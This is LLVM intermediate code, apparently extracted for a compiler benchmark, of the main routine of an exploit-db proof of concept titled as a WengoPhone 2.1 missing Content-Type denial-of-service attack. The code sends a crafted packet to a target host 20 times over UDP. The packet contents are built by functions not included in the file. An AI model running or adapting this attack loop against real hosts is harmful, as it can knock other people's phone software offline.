; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4281.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_4281.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_7__, i32 }
%struct.TYPE_7__ = type { %struct.TYPE_6__ }
%struct.TYPE_6__ = type { i32 }
%struct.TYPE_8__ = type { i32 (...)*, i32 (...)* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [45 x i8] c"WengoPhone 2.1 Missing Content-Type DOS PoC\0A\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c"usage : %s <host> <port> <localip>\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Create udp socket error!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@craft_pkt = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"[LOCALPORT]\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca [6 x i8], align 1
  %15 = alloca %struct.TYPE_8__, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 12, i32* %11, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 4
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 -1) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %6, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  store i32 %32, i32* %7, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 3
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %8, align 8
  %36 = call i32 (...) @socket_init()
  %37 = call i64 (...) @udpsocket()
  store i64 %37, i64* %12, align 8
  %38 = load i64, i64* %12, align 8
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %40, label %44

40:                                               ; preds = %25
  %41 = load i8*, i8** %6, align 8
  %42 = load i32, i32* %7, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %41, i32 %42)
  store i32 1, i32* %3, align 4
  br label %101

44:                                               ; preds = %25
  %45 = load i32, i32* %11, align 4
  %46 = call i32 @memset(%struct.sockaddr_in* %9, i32 0, i32 %45)
  %47 = load i64, i64* %12, align 8
  %48 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %49 = call i32 @getsockname(i64 %47, %struct.sockaddr* %48, i32* %11)
  %50 = load i32, i32* @AF_INET, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %50, i32* %51, align 4
  %52 = load i8*, i8** %6, align 8
  %53 = call i32 @resolv(i8* %52)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %55 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %54, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %55, i32 0, i32 0
  store i32 %53, i32* %56, align 4
  %57 = load i32, i32* %7, align 4
  %58 = call i32 @htons(i32 %57)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %58, i32* %59, align 4
  store i32 0, i32* %13, align 4
  br label %60

60:                                               ; preds = %97, %44
  %61 = load i32, i32* %13, align 4
  %62 = icmp slt i32 %61, 20
  br i1 %62, label %63, label %100

63:                                               ; preds = %60
  %64 = bitcast [6 x i8]* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %64, i8 0, i64 6, i1 false)
  %65 = load i32, i32* @craft_pkt, align 4
  %66 = load i8*, i8** %8, align 8
  %67 = load i8*, i8** %6, align 8
  %68 = call { i32 (...)*, i32 (...)* } @build_packet(i32 %65, i8* %66, i8* %67)
  %69 = bitcast %struct.TYPE_8__* %15 to { i32 (...)*, i32 (...)* }*
  %70 = getelementptr inbounds { i32 (...)*, i32 (...)* }, { i32 (...)*, i32 (...)* }* %69, i32 0, i32 0
  %71 = extractvalue { i32 (...)*, i32 (...)* } %68, 0
  store i32 (...)* %71, i32 (...)** %70, align 8
  %72 = getelementptr inbounds { i32 (...)*, i32 (...)* }, { i32 (...)*, i32 (...)* }* %69, i32 0, i32 1
  %73 = extractvalue { i32 (...)*, i32 (...)* } %68, 1
  store i32 (...)* %73, i32 (...)** %72, align 8
  %74 = getelementptr inbounds [6 x i8], [6 x i8]* %14, i64 0, i64 0
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %76 = load i32, i32* %75, align 4
  %77 = call i32 @ntohs(i32 %76)
  %78 = call i32 @sprintf(i8* %74, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 %77)
  %79 = getelementptr inbounds [6 x i8], [6 x i8]* %14, i64 0, i64 0
  %80 = bitcast %struct.TYPE_8__* %15 to { i32 (...)*, i32 (...)* }*
  %81 = getelementptr inbounds { i32 (...)*, i32 (...)* }, { i32 (...)*, i32 (...)* }* %80, i32 0, i32 0
  %82 = load i32 (...)*, i32 (...)** %81, align 8
  %83 = getelementptr inbounds { i32 (...)*, i32 (...)* }, { i32 (...)*, i32 (...)* }* %80, i32 0, i32 1
  %84 = load i32 (...)*, i32 (...)** %83, align 8
  %85 = call i32 @replace_all(i32 (...)* %82, i32 (...)* %84, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %79)
  %86 = load i64, i64* %12, align 8
  %87 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %15, i32 0, i32 1
  %88 = load i32 (...)*, i32 (...)** %87, align 8
  %89 = call i32 (...) %88()
  %90 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %15, i32 0, i32 0
  %91 = load i32 (...)*, i32 (...)** %90, align 8
  %92 = call i32 (...) %91()
  %93 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %94 = load i32, i32* %11, align 4
  %95 = call i32 @writeto(i64 %86, i32 %89, i32 %92, %struct.sockaddr* %93, i32 %94)
  %96 = call i32 @Sleep(i32 100)
  br label %97

97:                                               ; preds = %63
  %98 = load i32, i32* %13, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %13, align 4
  br label %60

100:                                              ; preds = %60
  store i32 0, i32* %3, align 4
  br label %101

101:                                              ; preds = %100, %40
  %102 = load i32, i32* %3, align 4
  ret i32 %102
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket_init(...) #1

declare dso_local i64 @udpsocket(...) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @getsockname(i64, %struct.sockaddr*, i32*) #1

declare dso_local i32 @resolv(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local { i32 (...)*, i32 (...)* } @build_packet(i32, i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @replace_all(i32 (...)*, i32 (...)*, i8*, i8*) #1

declare dso_local i32 @writeto(i64, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
